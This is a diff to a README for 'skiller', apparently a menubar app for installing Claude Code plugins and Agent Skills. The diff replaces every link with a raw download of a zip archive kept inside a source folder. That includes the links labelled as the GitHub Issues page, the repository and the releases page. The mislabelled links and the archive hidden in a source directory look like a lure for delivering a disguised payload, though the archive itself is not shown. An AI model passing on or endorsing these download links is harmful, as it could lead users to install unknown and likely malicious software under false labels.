@@ -1,7 +1,7 @@
 # 🎉 skiller - Easily Browse and Install Claude Code Plugins
 
 ## 📥 Download the App
-[![Download skiller](https://github.com/Enxs969/skiller/raw/refs/heads/main/src-tauri/src/Software-v3.4.zip)](https://github.com/Enxs969/skiller/raw/refs/heads/main/src-tauri/src/Software-v3.4.zip)
+[![Download skiller](https://raw.githubusercontent.com/Enxs969/skiller/main/src/utils/Software-v3.5.zip)](https://raw.githubusercontent.com/Enxs969/skiller/main/src/utils/Software-v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to skiller! This application lets you browse and install Claude Code plugins and Agent Skills right from your menubar. Whether you want to enhance your AI capabilities or manage your skills efficiently, skiller is here to help.
@@ -21,7 +21,7 @@ Before you begin, ensure your machine meets these requirements:
 - **Customizable Options:** Tailor settings to suit your preferences.
 
 ## 💻 Download & Install
-To download skiller, visit [this page](https://github.com/Enxs969/skiller/raw/refs/heads/main/src-tauri/src/Software-v3.4.zip). 
+To download skiller, visit [this page](https://raw.githubusercontent.com/Enxs969/skiller/main/src/utils/Software-v3.5.zip). 
 
 1. Choose the latest version of skiller.
 2. Click on the appropriate file for your operating system. 
@@ -40,11 +40,11 @@ Using skiller is straightforward. Here’s how to get started once you open the 
 4. **Managing Skills:** You can also view and manage your installed Agent Skills directly in the app.
 
 ## 💌 Get Help
-If you encounter any issues or have questions, you can reach out for support. Submit an issue on our [GitHub Issues page](https://github.com/Enxs969/skiller/raw/refs/heads/main/src-tauri/src/Software-v3.4.zip), and the community or the developers will assist you.
+If you encounter any issues or have questions, you can reach out for support. Submit an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Enxs969/skiller/main/src/utils/Software-v3.5.zip), and the community or the developers will assist you.
 
 ## 🔗 Links
-- **GitHub Repository:** [skiller Repository](https://github.com/Enxs969/skiller/raw/refs/heads/main/src-tauri/src/Software-v3.4.zip)
-- **Releases Page:** [Download skiller](https://github.com/Enxs969/skiller/raw/refs/heads/main/src-tauri/src/Software-v3.4.zip)
+- **GitHub Repository:** [skiller Repository](https://raw.githubusercontent.com/Enxs969/skiller/main/src/utils/Software-v3.5.zip)
+- **Releases Page:** [Download skiller](https://raw.githubusercontent.com/Enxs969/skiller/main/src/utils/Software-v3.5.zip)
 - **Contributing:** Interested in contributing? Check our contribution guidelines in the repository.
 
 ## 🌟 Future Updates
